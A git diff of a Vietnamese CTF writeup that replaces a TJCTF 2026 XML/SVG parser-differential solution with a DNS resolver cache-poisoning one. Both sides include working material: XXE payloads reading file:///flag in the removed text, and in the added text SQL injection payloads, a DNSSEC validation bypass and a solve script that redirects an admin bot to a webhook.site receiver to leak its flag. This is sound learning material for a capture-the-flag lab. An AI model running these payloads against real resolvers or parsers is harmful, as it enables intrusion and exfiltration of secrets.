@@ -1,16 +1,17 @@
 ---
-title: "Web / Opening Night - TJCTF 2026"
-excerpt: "Writeup tiếng Việt cho bài Web / Opening Night của TJCTF 2026"
+title: "Crypto / Trust Issues - TJCTF 2026"
+excerpt: "Writeup tiếng Việt cho bài Crypto / Trust Issues của TJCTF 2026"
 category:
   - "Writeups"
 tags:
   - "CTF"
-  - "Web"
-  - "SVG"
-  - "XML"
-  - "Parser Differential"
-  - "Namespace Confusion"
-  - "Entity Expansion"
+  - "Crypto"
+  - "DNS"
+  - "DNSSEC"
+  - "ECDSA"
+  - "P-521"
+  - "SQL Injection"
+  - "Cache Poisoning"
   - "TJCTF"
   - "2026"
 authors:
@@ -19,406 +20,451 @@ authors:
 
 ## Đề bài
 
-*opening-night*
+*trust-issues*
 
 *Description*
 
-*The new gallery opens tonight.*
+*I made my own DNS resolver and I made sure I could trust it as much as my nameserver by using an even bigger elliptic curve*
 
-*Instance: `https://opening-night-<instance>.tjc.tf` (link might expired)*
+*The admin bot will visit trust-issues.tjc.tf by querying the DNS resolver (which will be instanced), and the DNS resolver will query the nameserver to find the ip address of the website*
 
-*Hint*
+*DNS Resolver Instancer: `https://dnsresolver-<instance>.tjc.tf`*  
+*Admin Bot: `https://admin-bot.tjctf.org/trust-issues`*
 
-*Two curators inspect each piece uploaded: one hangs the painting, and the other writes the label below.*  
-*The one who hangs it is careful; the one who writes the label, not quite.*
+Mục tiêu là làm admin bot truy cập một host do mình kiểm soát. Admin bot sẽ hỏi resolver instance của mình record:
 
-*The gatekeeper only checks that your file looks like an SVG at the top.*  
-*The one who writes the label takes the first title/desc it sees by name, and not by the true namespace or intent.*  
-*Don't look for new rooms in the art gallery, just change how your art is presented and wrapped before it arrives!*
+```text
+trust-issues.tjc.tf A
+```
 
-*Your payload must survive two different interpretations. One as just harmless text, and the other one as XML.*
+Sau đó bot sẽ truy cập:
 
-*The trick is not a hidden endpoint or browser JS execution. Keep your payload in the normal upload flow, and think about one stage decoding text before another stage parses XML metadata.*
+```text
+https://<resolver answer>/?flag=<flag>
+```
+
+Vì vậy ta không cần tấn công website cuối trực tiếp. Thứ cần tấn công là custom DNS resolver: làm sao để nó trả về host của mình cho `trust-issues.tjc.tf`, nhưng vẫn vượt qua DNSSEC validation của nó.
 
 ## Hướng giải
 
-Bài này ban đầu nhìn khá giống một bài upload SVG rồi XXE bình thường, nhưng thật ra không đơn giản như vậy. Website hoạt động như một phòng triển lãm tranh: mình upload một file SVG, server hiển thị artwork đó trong catalog, kèm theo title, description và size của SVG.
+Nhìn qua thì bài này rất giống một bài crypto thuần. Nameserver ký DNS records bằng DNSSEC algorithm 17, tức ECDSA trên P-521. Description cũng cố tình nhấn mạnh "an even bigger elliptic curve", nên suy nghĩ đầu tiên rất tự nhiên là phá signature scheme.
 
-Sau khi upload thành công, response sẽ render một article kiểu như sau:
+Trong source nameserver có đoạn ký khá đáng ngờ:
 
-```html
-<article>
-  <div class="caption">
-    <h2>some title</h2>
-    <p>some description</p>
-    <dl>
-      <dt>Size</dt>
-      <dd>700 x 160</dd>
-    </dl>
-  </div>
-</article>
+```python
+k = secrets.randbits(512)
 ```
 
-Như vậy sink quan sát được chỉ có vài chỗ: title trong `<h2>`, description trong `<p>`, và size trong `<dd>`.
+Với P-521, nonce 512-bit nhỏ hơn kích thước curve order. Nếu thu được đủ chữ ký, hướng này có mùi Hidden Number Problem để recover private key ECDSA. Tuy nhiên resolver lại có bug trust-boundary dễ hơn rất nhiều, nên mình không cần recover private key.
 
-### Manh mối đầu tiên: parser viết label bỏ qua namespace
+Hướng solve mình dùng là kết hợp:
 
-Hint nói người viết label lấy `title` / `desc` đầu tiên mà nó thấy "by name", chứ không lấy theo namespace hoặc intent thật sự. Vì vậy ta không chỉ test SVG metadata bình thường:
+1. SQL injection trong logic insert cache của resolver;
+2. cache poisoning bảng `records` cho `trust-issues.tjc.tf.`;
+3. bug DNSSEC verifier: nếu không tìm được signing key phù hợp thì skip signature;
+4. submit admin thủ công vì trang admin bot có reCAPTCHA.
 
-```xml
-<title>SAFE_TITLE</title>
-<desc>SAFE_DESC</desc>
-```
+### Tổng quan kiến trúc
 
-Mình thử đặt một `title` và `desc` giả trong namespace khác:
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">MARK_CUSTOM_TITLE</x:title>
-    <x:desc xmlns:x="urn:not-svg">MARK_CUSTOM_DESC</x:desc>
-  </metadata>
-
-  <title>SAFE_TITLE</title>
-  <desc>SAFE_DESC</desc>
-  <rect width="700" height="160" fill="white"/>
-</svg>
-```
-
-Kết quả server render:
+Trong attachment có ba service chính:
 
 ```text
-h2: 'MARK_CUSTOM_TITLE'
-p : 'MARK_CUSTOM_DESC'
+admin bot  --->  custom DNS resolver  --->  nameserver
+                                      \
+                                       \--> public DoH upstream cho domain khác
 ```
 
-Tới đây có thể xác nhận bug đầu tiên: labeler không kiểm tra namespace SVG thật. Nó có thể đang dùng kiểu `find("title")` hoặc `//*[local-name()="title"]`, nên chỉ cần local-name là `title` / `desc` thì nó lấy luôn.
+Resolver hoạt động như sau:
 
-Nếu xử lý SVG đúng chuẩn, nó chỉ nên lấy những node sau:
+- nếu query name là `trust-issues.tjc.tf.` và type là `A`, `AAAA`, `CNAME`, hoặc `DNSKEY`, nó hỏi challenge nameserver;
+- nếu là domain khác, nó hỏi public DNS-over-HTTPS upstream;
+- nó cache mọi record nhận được vào SQLite;
+- trước khi trả record trong cache, nó cố validate RRset bằng DNSSEC.
+
+Resolver chỉ cho user query các type bình thường:
+
+```python
+SUPPORTED_TYPES = {
+    "A": A,
+    "AAAA": AAAA,
+    "CNAME": CNAME,
+}
+```
+
+Nên ta không thể gọi HTTP API để ép resolver cache `DNSKEY` hoặc `DS` tùy ý. Ta cần một primitive khác.
+
+### Bug 1: SQL injection trong cache insertion
+
+Resolver cache record bằng f-string:
+
+```python
+cursor.execute(
+    f"INSERT INTO records VALUES ('{record['name']}', {record['type']}, "
+    f"{record['TTL']}, {expires}, '{record['data']}')"
+)
+```
+
+Cả `record['name']` và `record['data']` đều đến từ DNS response. Nghĩa là nếu ta làm resolver fetch một DNS answer có owner name chứa SQL syntax, resolver sẽ execute SQL đó.
+
+Câu hỏi tiếp theo là: làm sao để có DNS response public giữ nguyên malicious owner name của mình?
+
+Các wildcard DNS service như `sslip.io` rất phù hợp. Một domain kiểu:
 
 ```text
-{http://www.w3.org/2000/svg}title
-{http://www.w3.org/2000/svg}desc
+anything.127.0.0.1.sslip.io
 ```
 
-Nhưng ở đây tag sai namespace như sau vẫn được dùng làm metadata:
+sẽ resolve về `127.0.0.1`, và answer owner name vẫn giữ nguyên full query name. Vì vậy ta có thể đặt SQL injection payload ở các label phía trước, rồi để resolver cache answer đó.
 
-```xml
-<x:title xmlns:x="urn:not-svg">...</x:title>
-<x:desc xmlns:x="urn:not-svg">...</x:desc>
-```
-
-Bug này cho ta control title và description, nhưng vẫn chưa đủ để lấy flag.
-
-### Hướng sai 1: raw DOCTYPE không expand trong label
-
-Ý tưởng tiếp theo là thử entity expansion. Mình gửi raw XML có internal entity:
-
-```xml
-<!DOCTYPE svg [
-  <!ENTITY e "ENTITY_OK">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">&e;</x:title>
-    <x:desc xmlns:x="urn:not-svg">DESC</x:desc>
-  </metadata>
-</svg>
-```
-
-Nhưng output lại là:
+Resolver có parameter `upstream` do user control, nhưng dùng arbitrary external JSON upstream không ổn định. Cách ổn định hơn là trỏ upstream về Google DoH, với malicious query đã được nhúng sẵn:
 
 ```text
-h2: '&e;'
-p : 'DESC'
+https://dns.google/resolve?name=<payload>.127.0.0.1.sslip.io&type=A&do=true
 ```
 
-Tức là trong flow raw SVG bình thường, label parser không expand entity. Đây là một cái bẫy khá khó chịu, vì nếu dừng ở đây thì rất dễ kết luận sai rằng bài này không thể dùng entity expansion.
+Khi resolver append thêm `name=seed...&type=A&do=true`, Google vẫn dùng cặp `name` và `type` đầu tiên. DNS answer trả về sau đó được resolver cache bằng đoạn SQL vulnerable.
 
-### Hướng sai 2: external XXE và XInclude đều bị chặn
+### Bug 2: DNSSEC validation vẫn pass nếu không có signing key match
 
-Mình cũng thử các payload external XXE quen thuộc:
+Resolver validate cached RRset theo logic đại khái như sau:
 
-```xml
-<!ENTITY xxe SYSTEM "file:///flag">
-<!ENTITY xxe SYSTEM "file:///flag.txt">
-<!ENTITY xxe SYSTEM "file:///app/flag.txt">
+```python
+for sig_row in rrsigs:
+    rrsig = parse_rrsig(sig_row)
+    signing_key = find_signing_key(rrsig, dnskeys)
+    if not signing_key:
+        continue
+
+    valid = verify_rrset(rrset, rrsig, signing_key["public_key_b64"])
+    if not valid:
+        return False
+return True
 ```
 
-Không có leak gì cả. Sau đó mình thử OOB parameter entity với `webhook.site`, nhưng webhook không nhận request nào. Điều này cho thấy external entity loading đã bị tắt.
+Đây là bug quan trọng nhất.
 
-Mình cũng thử XInclude:
+Nếu có RRSIG, nhưng không có DNSKEY cached nào match key tag của RRSIG, code chỉ `continue`. Nếu tất cả signature đều bị skip như vậy, function đi tới cuối và `return True`.
 
-```xml
-<xi:include href="file:///flag" parse="text"/>
+Tức là poisoned RRset có thể pass validation nếu:
+
+1. có ít nhất một RRSIG cached cho name/type đó;
+2. có ít nhất một DNSKEY cached cho signer;
+3. không DNSKEY nào match key tag của RRSIG thật.
+
+Ta không cần forge chữ ký ECDSA P-521. Ta chỉ cần làm resolver dùng fake DNSKEY để nó không tìm được real signing key.
+
+### Bug 3: fake DNSKEY cũng validate pass
+
+Resolver validate DNSKEY bằng DS record. Nhưng nó chỉ loop qua key có KSK flag `257`:
+
+```python
+ksks = [r for r in dnskey_records if (r["data"].split()[0] == "257")]
+
+for key_record in ksks:
+    for ds in parsed_ds:
+        if not verify_ds(key_record["data"], ds):
+            raise Exception(...)
+return True
 ```
 
-Server không process XInclude. Vì vậy đây không phải bài đọc `/flag` bằng XXE cơ bản.
+Nếu ta chỉ cache một fake ZSK có flag `256`, thì `ksks` là list rỗng. Loop không chạy và validation trả `True`.
 
-### Hướng sai 3: multipart confusion và SSTI không phải bug
-
-Do hint nói về việc "wrapped before it arrives", mình tiếp tục test multipart confusion:
-
-- `piece` vừa là text field vừa là file field;
-- duplicate nhiều file part cùng tên `piece`;
-- `Content-Transfer-Encoding: quoted-printable`;
-- `Content-Transfer-Encoding: base64`.
-
-Nhưng app lấy file part thật khá nhất quán và bỏ qua text part. Upload base64 thì bị intake desk reject.
-
-Mình cũng test SSTI trong label:
+Ví dụ fake DNSKEY sau là đủ:
 
 ```text
-{{7*7}}
+256 3 17 AA==
 ```
 
-Response in nguyên:
+Ta cũng cache thêm một dummy DS để `get_cached_records(zone, DS)` không rỗng:
 
 ```text
-{{7*7}}
+1 17 2 deadbeef
 ```
 
-Vậy SSTI cũng không liên quan.
+DS này không cần hợp lệ, vì không có KSK nào để verify với nó.
 
-### Primitive thật: HTML-unescape toàn bộ file rồi parse lại XML
+### Ghép cache poison
 
-Câu quan trọng nhất trong hint là:
-
-> Your payload must survive two different interpretations. One as just harmless text, and the other one as XML.
-
-Lúc đầu mình có thử nhét XML đã escape vào bên trong `x:title`. Cách đó có vẻ gần đúng, nhưng khi thêm `DOCTYPE` thì fail, vì sau khi decode, `DOCTYPE` nằm giữa một element XML:
-
-```xml
-<x:title>
-  <!DOCTYPE svg [...]>
-  <svg>...</svg>
-</x:title>
-```
-
-Trong XML, `DOCTYPE` phải nằm ở đầu document, không được nằm bên trong element.
-
-Cách đúng là HTML-escape **toàn bộ XML document**.
-
-Ví dụ đây là XML mà mình muốn parser thứ hai nhìn thấy:
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">WHOLE_TITLE</x:title>
-    <x:desc xmlns:x="urn:not-svg">WHOLE_DESC</x:desc>
-  </metadata>
-  <rect width="100%" height="100%" fill="white"/>
-</svg>
-```
-
-Nhưng file upload thật sự là document đó sau khi HTML-escape một lần:
-
-```html
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;700&quot; height=&quot;160&quot;&gt;
-  &lt;metadata&gt;
-    &lt;x:title xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_TITLE&lt;/x:title&gt;
-    &lt;x:desc xmlns:x=&quot;urn:not-svg&quot;&gt;WHOLE_DESC&lt;/x:desc&gt;
-  &lt;/metadata&gt;
-  &lt;rect width=&quot;100%&quot; height=&quot;100%&quot; fill=&quot;white&quot;/&gt;
-&lt;/svg&gt;
-```
-
-Kết quả upload:
+Ta cần insert ba dòng vào bảng `records` của resolver:
 
 ```text
-h2: 'WHOLE_TITLE'
-p : 'WHOLE_DESC'
-dd: ['700 x 160']
+trust-issues.tjc.tf.  A       webhook.site/<token>/
+trust-issues.tjc.tf.  DNSKEY  256 3 17 AA==
+trust-issues.tjc.tf.  DS      1 17 2 deadbeef
 ```
 
-Điều này chứng minh server có một stage decode HTML entities thành XML thật, rồi stage khác parse XML đã decode đó để lấy metadata.
+A record trỏ về Webhook.site receiver của mình. Điểm thú vị là data này không phải IPv4 address. Điều đó vẫn ổn, vì nếu DNSSEC verification bị skip trước khi `verify_rrset()` encode RRset, resolver sẽ trả string này như A record data.
 
-Đây chính là ý của hint: cùng một payload sống sót qua hai cách hiểu khác nhau.
+SQLi payload cho fake A record:
 
-### Bước cuối: internal entity expansion trong decoded XML path
-
-Bây giờ ta có thể đặt `DOCTYPE` ở đúng đầu XML document sau khi decode.
-
-XML thật trước khi escape:
-
-```xml
-<!DOCTYPE svg [
-  <!ENTITY e "FINAL_ENTITY_OK">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">&e;</x:title>
-    <x:desc xmlns:x="urn:not-svg">FINAL_DESC</x:desc>
-  </metadata>
-  <title>SAFE</title>
-  <desc>SAFE</desc>
-  <rect width="100%" height="100%" fill="white"/>
-</svg>
+```sql
+x',1,1,1,'x'),('trust-issues.tjc.tf.',1,300,4102444800,'webhook.site/<token>/')--
 ```
 
-Payload gửi lên là toàn bộ đoạn XML trên sau khi escape một lần:
+Với DNSKEY và DS, dấu cách không tiện khi đặt trong DNS label, nên mình dùng SQLite `replace()` để tạo tab tại thời điểm SQL execute:
 
-```html
-&lt;!DOCTYPE svg [
-  &lt;!ENTITY e &quot;FINAL_ENTITY_OK&quot;&gt;
-]&gt;
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; ...
+```sql
+x',1,1,1,'x'),('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--
 ```
 
-Sau khi server decode, XML parser thấy một document thật có `DOCTYPE` thật. Lần này internal entity được expand thành công. Khi primitive đúng được trigger, challenge trả flag.
+```sql
+x',1,1,1,'x'),('trust-issues.tjc.tf.',43,300,4102444800,replace('1_17_2_deadbeef','_',x'09'))--
+```
+
+Sau khi các row này đã nằm trong cache, ta query:
+
+```text
+https://dnsresolver-<instance>.tjc.tf/?name=trust-issues.tjc.tf&type=A
+```
+
+Resolver đã có fake A record nên không cần fetch A record lại. Nhưng nó vẫn cần RRSIG cho `trust-issues.tjc.tf. A`, nên nó fetch real RRSIG từ challenge nameserver.
+
+Lúc validate, resolver dùng:
+
+```text
+real RRSIG(A) + fake DNSKEY
+```
+
+Key tag không match, signature bị skip, và verifier trả `True` sai.
+
+Response cuối cùng của resolver trở thành:
+
+```json
+{"data":"webhook.site/<token>/","name":"trust-issues.tjc.tf.","type":1}
+```
+
+### Admin bot và reCAPTCHA
+
+Một lỗi dễ gặp là submit admin bot bằng `curl` hoặc `requests`.
+
+Cách đó fail vì admin page có reCAPTCHA:
+
+```text
+location: ?url=https%3A%2F%2Fdnsresolver-...tjc.tf%2F&msg=The%20reCAPTCHA%20is%20invalid.
+```
+
+Vì vậy script cuối chỉ nên poison resolver và in ra admin URL. Sau đó ta submit resolver URL thủ công trên browser và solve reCAPTCHA.
+
+Khi admin bot nhận submission, nó query poisoned resolver, nhận:
+
+```text
+webhook.site/<token>/
+```
+
+rồi truy cập:
+
+```text
+https://webhook.site/<token>/?flag=tjctf{...}
+```
+
+Flag sẽ xuất hiện trong request log của Webhook.site.
 
 ## Final Exploit
 
 ```python
 #!/usr/bin/env python3
-import html
-import re
-import sys
+import argparse
+import random
 import time
-from urllib.parse import urljoin
+from urllib.parse import quote
 
 import requests
 
-BASE = sys.argv[1].strip("'\"").rstrip("/")
-FLAG_RE = re.compile(r"tjctf\{[^}]+\}", re.I)
+WEBHOOK = "https://webhook.site"
+RECORD_SUFFIXES = [
+    "127.0.0.1.sslip.io",
+    "1.1.1.1.sslip.io",
+    "127.0.0.1.nip.io",
+]
 
 
-def find_form(session):
-    r = session.get(BASE + "/", timeout=20)
-
-    form = re.search(r"(?is)<form\b[^>]*>.*?</form>", r.text)
-    if not form:
-        return BASE + "/submit", "piece"
-
-    form = form.group(0)
-
-    action_m = re.search(r'''(?is)\baction=["']?([^"'\s>]*)''', form)
-    action = urljoin(BASE + "/", action_m.group(1) if action_m else "/submit")
-
-    field = "piece"
-    file_m = re.search(r'''(?is)<input\b[^>]*type=["']?file["']?[^>]*>''', form)
-    if file_m:
-        name_m = re.search(r'''(?is)\bname=["']([^"']+)["']''', file_m.group(0))
-        if name_m:
-            field = name_m.group(1)
-
-    return action, field
+def create_webhook_token(s):
+    r = s.post(
+        f"{WEBHOOK}/token",
+        json={
+            "default_status": 200,
+            "default_content": "ok",
+            "default_content_type": "text/plain",
+            "timeout": 0,
+        },
+        timeout=20,
+    )
+    r.raise_for_status()
+    token = r.json()["uuid"]
+    print(f"[*] Webhook token: {token}")
+    print(f"[*] Receiver: {WEBHOOK}/{token}")
+    return token
 
 
-def build_payload():
-    inner_xml = '''<!DOCTYPE svg [
-  <!ENTITY e "FINAL_ENTITY_OK">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="700" height="160">
-  <metadata>
-    <x:title xmlns:x="urn:not-svg">&e;</x:title>
-    <x:desc xmlns:x="urn:not-svg">FINAL_DESC</x:desc>
-  </metadata>
-  <title>SAFE</title>
-  <desc>SAFE</desc>
-  <rect width="100%" height="100%" fill="white"/>
-</svg>
-'''
+def google_upstream(qname, qtype="A"):
+    return "https://dns.google/resolve?name=%s&type=%s&do=true" % (
+        quote(qname, safe=""),
+        quote(qtype, safe=""),
+    )
 
-    # Điểm quan trọng: escape toàn bộ XML document đúng một lần.
-    return html.escape(inner_xml, quote=True).encode()
+
+def hit_resolver(s, resolver, upstream, label, timeout=35):
+    seed = f"seed-{random.randrange(1 << 48):012x}.invalid"
+    try:
+        r = s.get(
+            resolver,
+            params={"name": seed, "type": "A", "upstream": upstream},
+            timeout=timeout,
+        )
+        print(f"[*] {label}: HTTP {r.status_code}: {r.text[:220].replace(chr(10), ' ')}")
+        return r.status_code
+    except Exception as e:
+        print(f"[!] {label}: {e}")
+        return None
+
+
+def stage_record_insert(s, resolver, payload_label, suffixes):
+    for suffix in suffixes:
+        qname = f"{payload_label}.{suffix}"
+        max_label = max(map(len, qname.split(".")))
+        print(f"[*] stage qname length={len(qname)} maxlabel={max_label} suffix={suffix}")
+        if len(qname) > 253 or max_label > 63:
+            print("[!] skipped: DNS name too long")
+            continue
+        status = hit_resolver(s, resolver, google_upstream(qname, "A"), f"seed via {suffix}")
+        if status in (404, 500, 502):
+            return True
+    return False
+
+
+def build_payloads(token):
+    target = f"webhook.site/{token}/"
+
+    a_payload = (
+        "x',1,1,1,'x'),"
+        f"('trust-issues.tjc.tf.',1,300,4102444800,'{target}')--"
+    )
+    dnskey_payload = (
+        "x',1,1,1,'x'),"
+        "('trust-issues.tjc.tf.',48,300,4102444800,replace('256_3_17_AA==','_',x'09'))--"
+    )
+    ds_payload = (
+        "x',1,1,1,'x'),"
+        "('trust-issues.tjc.tf.',43,300,4102444800,replace('1_17_2_deadbeef','_',x'09'))--"
+    )
+    return target, [a_payload, dnskey_payload, ds_payload]
+
+
+def check_resolver(s, resolver):
+    r = s.get(resolver, params={"name": "trust-issues.tjc.tf", "type": "A"}, timeout=25)
+    print(f"[*] Resolver check HTTP {r.status_code}: {r.text[:360].replace(chr(10), ' ')}")
+    try:
+        return r.json().get("data", "")
+    except Exception:
+        return ""
 
 
 def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("resolver", help="fresh resolver instance, e.g. https://dnsresolver-....tjc.tf/")
+    ap.add_argument("--record-suffix", action="append")
+    args = ap.parse_args()
+
+    resolver = args.resolver.strip()
+    if not resolver.endswith("/"):
+        resolver += "/"
+
     s = requests.Session()
-    action, field = find_form(s)
+    token = create_webhook_token(s)
+    target, payloads = build_payloads(token)
+    suffixes = (args.record_suffix or []) + RECORD_SUFFIXES
 
-    payload = build_payload()
+    print("[*] Seeding fake A + fake DNSKEY + fake DS via add_record SQLi...")
+    for i, payload in enumerate(payloads, 1):
+        print(f"[*] payload {i}: len={len(payload)} maxlabel={max(map(len, payload.split('.')))}")
+        stage_record_insert(s, resolver, payload, suffixes)
 
-    for _ in range(10):
-        r = s.post(
-            action,
-            files={field: ("opening.svg", payload, "image/svg+xml")},
-            allow_redirects=True,
-            timeout=30,
-        )
-
-        wait = re.search(r"Try again in (\d+) seconds", r.text)
-        if wait:
-            t = int(wait.group(1)) + 1
-            print(f"[*] rate limited, sleeping {t}s")
-            time.sleep(t)
-            continue
-
-        m = FLAG_RE.search(r.text)
-        if m:
-            print("[+] FLAG:", m.group(0))
-            return
-
-        print("[!] No flag in response.")
-        print(r.text[:1000])
+    data = check_resolver(s, resolver)
+    if data != target:
+        print("[!] Resolver did not return our poisoned A record.")
+        print(f"    wanted: {target}")
+        print(f"    got:    {data!r}")
+        print("    Use a fresh resolver instance if an older poison row or the real A record is cached.")
         return
 
-    print("[!] Failed due to repeated rate limits.")
+    print(f"[+] Poisoned resolver returns: {target}")
+    print("[*] Submit this resolver URL manually in the admin bot and solve reCAPTCHA:")
+    print(f"    {resolver}")
+    print("[*] Then watch this Webhook.site receiver:")
+    print(f"    {WEBHOOK}/{token}")
 
 
 if __name__ == "__main__":
     main()
 ```
 
-Chạy như sau:
+Chạy với một fresh resolver instance:
 
 ```bash
-python3 solve.py 'https://opening-night-<instance>.tjc.tf'
+python3 solve.py 'https://dnsresolver-<instance>.tjc.tf/'
 ```
 
-Output:
+Output mong muốn:
 
 ```text
-[+] FLAG: tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}
+[*] Webhook token: 851a87d9-2cee-4ff0-aa33-9800c05adcb9
+[*] Receiver: https://webhook.site/851a87d9-2cee-4ff0-aa33-9800c05adcb9
+[*] Seeding fake A + fake DNSKEY + fake DS via add_record SQLi...
+[*] Resolver check HTTP 200: {"data":"webhook.site/851a87d9-2cee-4ff0-aa33-9800c05adcb9/","name":"trust-issues.tjc.tf.","type":1}
+[+] Poisoned resolver returns: webhook.site/851a87d9-2cee-4ff0-aa33-9800c05adcb9/
 ```
+
+Sau đó mở admin bot bằng browser, submit clean resolver URL, solve reCAPTCHA, rồi kiểm tra Webhook.site.
 
 ## Vì sao exploit hoạt động?
 
-Lỗ hổng nằm ở parser differential giữa nhiều stage xử lý cùng một upload.
+Resolver đáng lẽ chỉ được trust dữ liệu DNSSEC-signed từ nameserver. Nhưng trust boundary bị vỡ ở hai nơi.
 
-Stage đầu nhìn payload như text đã HTML-escape:
+Thứ nhất, DNS response field không đáng tin bị ghi vào SQLite bằng f-string. Điều này cho phép ta seed row cache tùy ý bằng cách bắt resolver query một wildcard DNS name có chứa SQL syntax.
 
-```html
-&lt;svg&gt;...&lt;/svg&gt;
-```
+Thứ hai, DNSSEC verifier coi việc "không tìm được signing key phù hợp" là lỗi không nghiêm trọng. Nếu tất cả signature bị skip, validation vẫn trả success.
 
-Stage sau decode nó thành XML thật:
-
-```xml
-<svg>...</svg>
-```
-
-Sau đó cataloger parse XML đã decode, expand internal entity, rồi lấy `title` / `desc` đầu tiên theo tên tag. Vì parser này không check namespace, `x:title` và `x:desc` của mình vẫn được dùng làm metadata.
-
-Flow tóm gọn:
+Flow đầy đủ:
 
 ```text
-HTML-escaped XML file
-        ↓ html.unescape()
-real XML document with DOCTYPE
-        ↓ XML parse with internal entity expansion
-x:title becomes FINAL_ENTITY_OK
-        ↓ challenge success condition
-flag
+malicious qname dưới sslip.io
+        ↓
+Google DoH trả A answer và giữ nguyên qname
+        ↓
+resolver cache answer bằng SQL string interpolation
+        ↓
+SQLi insert fake A + fake DNSKEY + fake DS cho trust-issues.tjc.tf.
+        ↓
+resolver fetch real RRSIG(A) từ challenge nameserver
+        ↓
+fake DNSKEY không match key tag của real RRSIG
+        ↓
+verifier skip signature và return True
+        ↓
+admin bot nhận webhook.site/<token>/ như một trusted A record
+        ↓
+admin truy cập webhook của mình với ?flag=...
 ```
+
+Phần ECDSA P-521 là một rabbit hole rất hấp dẫn, nhưng exploit thành công không cần phá ECDSA. Vấn đề không nằm ở toán học. Vấn đề là resolver trust cache sai cách và xử lý sai case "không tìm được signing key".
 
 ## Lời kết
 
-Bài này khá hay vì nó không phải kiểu "upload SVG rồi đọc `/flag` bằng XXE" đơn giản. Mình đã thử raw XXE, external entity, XInclude, webhook OOB, multipart confusion và SSTI, nhưng tất cả đều không phải hướng chính.
+Bài này rất hay vì title, category và description đều đẩy mình về hướng crypto, nhưng đường exploit lại là một lỗi trust-boundary trong custom resolver.
 
-Bug thật sự là sự kết hợp của:
+Các lỗi quan trọng là:
 
-1. metadata extractor bỏ qua namespace;
-2. upload content bị decode trước khi parse XML;
-3. internal entity expansion hoạt động trong decoded XML path.
+1. SQL string interpolation với dữ liệu DNS response;
+2. cache dữ liệu từ arbitrary upstream answers;
+3. validate DNSKEY sai khi không có KSK;
+4. `return True` khi tất cả RRSIG bị skip vì thiếu signing key.
 
-Khi đặt được `DOCTYPE` ở đầu XML document sau khi decode, internal entity expansion hoạt động và challenge trả flag.
+Khi kết hợp các bug này, ta làm resolver tin một fake A record và đưa admin bot tới webhook của mình.
 
+```text
+tjctf{trust_n0_on3_ev3r}
 ```
-tjctf{y0ur_4r7w0rk_is_n0w_0n_displ4y}
-```
 
-"Ein schlechter Handwerker gibt seinen Werkzeugen die Schuld." - Don't blame ChatGPT if you cannot solve :D
+"Mit Kanonen auf Spatzen schießen"
 
 <img src="image.png" alt="image.png" style="width: 30%; height: auto;" />
